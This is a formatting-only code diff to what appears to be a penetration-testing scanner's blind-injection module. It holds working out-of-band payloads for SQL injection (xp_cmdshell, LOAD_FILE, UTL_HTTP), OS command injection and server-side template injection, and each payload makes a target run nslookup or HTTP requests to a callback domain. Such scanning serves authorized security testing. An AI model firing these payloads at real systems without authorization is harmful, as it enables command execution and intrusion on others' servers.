@@ -130,15 +130,15 @@ async def injection_test(
     # OOB blind injection: inject OOB payloads and poll for callbacks
     if oob_domain and oob_session_cid:
         try:
-            await _oob_blind_injection(
-                url, oob_domain, type_set, method, extra_headers, param_list, body_dict
-            )
+            await _oob_blind_injection(url, oob_domain, type_set, method, extra_headers, param_list, body_dict)
 
             # Poll for callbacks after a short delay
             import asyncio
+
             await asyncio.sleep(3)
 
             from numasec.tools.oob_tool import python_oob_poll
+
             poll_raw = await python_oob_poll(correlation_id=oob_session_cid)
             poll_data = json.loads(poll_raw) if isinstance(poll_raw, str) else poll_raw
 
@@ -151,18 +151,20 @@ async def injection_test(
                 for interaction in interactions:
                     full_id = interaction.get("full_id", "")
                     vuln_type = _correlate_oob_interaction(full_id)
-                    results["vulnerabilities"].append({
-                        "type": f"blind_{vuln_type}",
-                        "severity": "high",
-                        "confidence": 0.95,
-                        "evidence": (
-                            f"OOB callback received: {interaction.get('protocol', 'unknown')} "
-                            f"from {interaction.get('remote_address', 'unknown')} "
-                            f"(blind {vuln_type} confirmed via DNS/HTTP callback)"
-                        ),
-                        "parameter": "",
-                        "payload": f"OOB domain: {oob_domain}",
-                    })
+                    results["vulnerabilities"].append(
+                        {
+                            "type": f"blind_{vuln_type}",
+                            "severity": "high",
+                            "confidence": 0.95,
+                            "evidence": (
+                                f"OOB callback received: {interaction.get('protocol', 'unknown')} "
+                                f"from {interaction.get('remote_address', 'unknown')} "
+                                f"(blind {vuln_type} confirmed via DNS/HTTP callback)"
+                            ),
+                            "parameter": "",
+                            "payload": f"OOB domain: {oob_domain}",
+                        }
+                    )
             else:
                 results["oob"] = {"blind_vulnerability_confirmed": False}
         except Exception as exc:
@@ -226,24 +228,33 @@ async def _oob_blind_injection(
     oob_payloads: list[tuple[str, str]] = []
 
     if "sql" in type_set:
-        oob_payloads.extend([
-            ("sqli", f"' OR LOAD_FILE('\\\\\\\\sqli.{oob_domain}\\\\a')-- -"),
-            ("sqli", f"'; EXEC xp_cmdshell 'nslookup sqli.{oob_domain}'-- -"),
-            ("sqli", f"' || UTL_HTTP.REQUEST('http://sqli.{oob_domain}/')-- -"),
-        ])
+        oob_payloads.extend(
+            [
+                ("sqli", f"' OR LOAD_FILE('\\\\\\\\sqli.{oob_domain}\\\\a')-- -"),
+                ("sqli", f"'; EXEC xp_cmdshell 'nslookup sqli.{oob_domain}'-- -"),
+                ("sqli", f"' || UTL_HTTP.REQUEST('http://sqli.{oob_domain}/')-- -"),
+            ]
+        )
 
     if "cmdi" in type_set:
-        oob_payloads.extend([
-            ("cmdi", f"; nslookup cmdi.{oob_domain}"),
-            ("cmdi", f"| nslookup cmdi.{oob_domain}"),
-            ("cmdi", f"$(nslookup cmdi.{oob_domain})"),
-        ])
+        oob_payloads.extend(
+            [
+                ("cmdi", f"; nslookup cmdi.{oob_domain}"),
+                ("cmdi", f"| nslookup cmdi.{oob_domain}"),
+                ("cmdi", f"$(nslookup cmdi.{oob_domain})"),
+            ]
+        )
 
     if "ssti" in type_set:
-        oob_payloads.extend([
-            ("ssti", f"{{{{config.__class__.__init__.__globals__['os'].popen('nslookup ssti.{oob_domain}').read()}}}}"),
-            ("ssti", f'${{T(java.lang.Runtime).getRuntime().exec("nslookup ssti.{oob_domain}")}}'),
-        ])
+        oob_payloads.extend(
+            [
+                (
+                    "ssti",
+                    f"{{{{config.__class__.__init__.__globals__['os'].popen('nslookup ssti.{oob_domain}').read()}}}}",
+                ),
+                ("ssti", f'${{T(java.lang.Runtime).getRuntime().exec("nslookup ssti.{oob_domain}")}}'),
+            ]
+        )
 
     if not oob_payloads:
         return
